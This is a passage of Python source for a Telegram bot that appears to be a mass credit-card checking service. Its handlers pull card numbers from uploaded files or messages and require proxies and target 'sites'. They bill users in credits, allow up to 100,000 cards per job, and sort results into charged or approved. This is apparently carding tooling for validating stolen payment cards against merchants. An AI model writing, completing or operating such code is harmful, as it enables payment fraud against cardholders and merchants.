            await update.message.reply_text(f"{E.WARNING} No proxies.", parse_mode="HTML")
            return
        if is_site_enabled() and not (get_working_site_urls() or []):
            await update.message.reply_text(f"{E.WARNING} No sites.", parse_mode="HTML")
            return

        cards, extracted_text = [], ""
        r = update.message.reply_to_message if update.message.reply_to_message else update.message
        if r.document:
            f = await context.bot.get_file(r.document.file_id)
            extracted_text = (await f.download_as_bytearray()).decode('utf-8', errors='ignore')
            cards = extract_cards(extracted_text)
        elif r.text:
            extracted_text = r.text
            cards = extract_cards(extracted_text)

        if not cards:
            await update.message.reply_text(
                f"<blockquote>{E.ERROR} <b>No Valid Cards Found</b></blockquote>\n"
                f"<pre>{html.escape(extracted_text[:300])}</pre>",
                parse_mode="HTML")
            return

        max_l = 100000 if (uid == OWNER_ID or is_db_admin(uid)) else 10000
        if len(cards) > max_l:
            await update.message.reply_text(f"{E.ERROR} Max {max_l} cards.", parse_mode="HTML")
            return
        if get_user_credits(uid) < 1 and get_user_credits(uid) != float('inf'):
            await update.message.reply_text(f"{E.WARNING} Need 1 credit.", parse_mode="HTML")
            return

        pending_mass_checks[uid] = {
            "cards": cards,
            "user_info": {"id": uid, "username": un, "first_name": fn},
            "update": update,
        }
        kb = InlineKeyboardMarkup([[
            success("Yes ✅", cb=f"msh_yes_{uid}"),
            danger("No ❌", cb=f"msh_no_{uid}"),
        ]])
        await update.message.reply_text(
            f"<blockquote>{E.INFO} <b>Approved cards?</b></blockquote>\n"
            f"Found: <code>{len(cards)}</code>\n"
            f"Yes: Chg+App\nNo: Chg only",
            parse_mode="HTML", reply_markup=kb)
    except Exception as e:
        logger.error(e)
        await update.message.reply_text(f"{E.ERROR} {html.escape(str(e)[:100])}",
                                         parse_mode="HTML")


async def handle_msh_confirm_callback(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if uid not in pending_mass_checks:
        await q.edit_message_text("No pending.", parse_mode="HTML")
        return
    pd = pending_mass_checks.pop(uid)
    try:
        await q.delete_message()
    except Exception:
        pass
    asyncio.create_task(process_mass(
        pd["cards"], pd["user_info"], pd["update"], context,
        q.data.startswith("msh_yes_")))


async def handle_msh_stop_callback(update, context):
    q = update.callback_query
    if not q.data.startswith("msh_stop_"):
        await q.answer()
        return
    sid = q.data.split("_")[2]
    if sid in active_mass_checks:
        active_mass_checks[sid]["stopped"] = True
        active_mass_checks[sid]["stop_event"].set()
        for t in active_mass_checks[sid]["workers"]:
            if not t.done():
                t.cancel()
        await q.answer("Stopping...", show_alert=True)
    else:
        await q.answer("Invalid.", show_alert=True)
